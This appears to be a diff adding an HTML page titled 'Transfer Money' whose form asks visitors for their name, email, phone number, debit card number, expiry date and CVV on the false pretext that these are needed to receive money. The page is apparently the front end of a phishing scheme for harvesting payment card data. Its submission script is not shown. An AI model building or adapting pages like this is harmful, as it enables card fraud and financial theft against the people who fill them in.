@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <link rel="shortcut icon" href="favicon.svg" type="image/svg" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="index.css">
+  <script src="index.js" async></script>
+  <title>Transfer Money</title>
+</head>
+<body>
+  <!-- Alert Component-->
+    <div class="alert-box">
+      <h3 id="title">Title</h3>
+      <p id="message">message</p>
+      <button type="submit" onclick="removeABox()">OK</button>
+    </div>
+  <!--Loader-->
+  <div class="loader">
+    <div class="load-a"></div>
+  </div>
+  <!-- Main Components -->
+	<header>
+	  <h2>WELLCOME</h2>
+	</header>
+	<section>
+	  <div class="form-div">
+	    <div class="message">
+	      <p>Enter Your Debit Card Details Here. To Recevie Money.</p>
+	    </div>
+	    <form action="" method="post" accept-charset="utf-8">
+	      <label for="Enter Your Name">Enter Your Name.</label><br />
+	      <input type="text" name="name" id="name" value="" /><br />
+	      <label for="Enter Your Email">Enter Your Email.</label><br />
+	      <input type="email" name="email" id="email" value="" /><br />
+	      <label for="Enter Phone Number">Enter Phone Number.</label><br />
+	      <input type="number" name="number" id="number" value=""/><br />
+	         <label for="Enter Phone Number">Enter Debit Card Number.</label><br />
+	     <input type="number" name="atm-num" id="atm-num" value="" /><br />
+	       <label for="Enter Debit Card Expairy">Enter Debit Card Expairy.</label><br />
+	       <input type="date" name="expdate" id="expdate" value="" />
+	       <label for="Enter CVV Number">Enter CVV Number.</label><br />
+	       <input type="number" name="cvv" id="cvv" value="" />
+	       <div class="button">
+	         <button type="submit" id="submitbtn">Submit</button>
+	       </div>
+	    </form>
+	  </div>
+	</section>
+</body>
+</html>
